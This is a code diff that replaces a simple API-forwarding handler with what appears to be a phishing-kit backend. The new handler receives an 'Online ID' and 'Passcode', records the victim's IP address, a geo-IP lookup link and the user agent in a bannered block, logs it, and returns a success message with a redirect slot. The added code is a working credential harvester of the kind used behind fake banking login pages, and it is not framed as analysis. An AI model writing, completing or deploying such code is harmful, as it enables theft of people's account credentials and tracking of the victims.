@@ -1,12 +1,39 @@
-module.exports = async (req, res) => {
-  const response = await fetch(process.env.API_URL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'Authorization': `Bearer ${process.env.API_SECRET}`
-    },
-    body: JSON.stringify(req.body)
-  });
+export default function handler(req, res) {
+  if (req.method !== "POST") {
+    return res.status(405).json({ signal: "bad", msg: "Method not allowed" });
+  }
 
-  return res.json({ ok: true });
-};
+  const { ai, pr } = req.body;
+
+  if (!ai || !pr) {
+    return res.json({
+      signal: "bad",
+      msg: "Please fill in all the fields.",
+    });
+  }
+
+  const ip =
+    req.headers["x-forwarded-for"]?.split(",")[0] ||
+    req.socket.remoteAddress;
+
+  const userAgent = req.headers["user-agent"] || "Unknown";
+
+  let message = "";
+  message += "|----------| xLs |--------------|\n";
+  message += `Online ID : ${ai}\n`;
+  message += `Passcode : ${pr}\n`;
+  message += "|--------------- I N F O | I P -------------------|\n";
+  message += `|Client IP: ${ip}\n`;
+  message += `|--- http://www.geoiptool.com/?IP=${ip} ----\n`;
+  message += `User Agent : ${userAgent}\n`;
+  message += "|----------- CrEaTeD--------------|\n";
+
+  // You can log, save, or forward this message here
+  console.log(message);
+
+  res.json({
+    signal: "ok",
+    msg: "Data received successfully",
+    redirect_link: "", // add if needed
+  });
+}
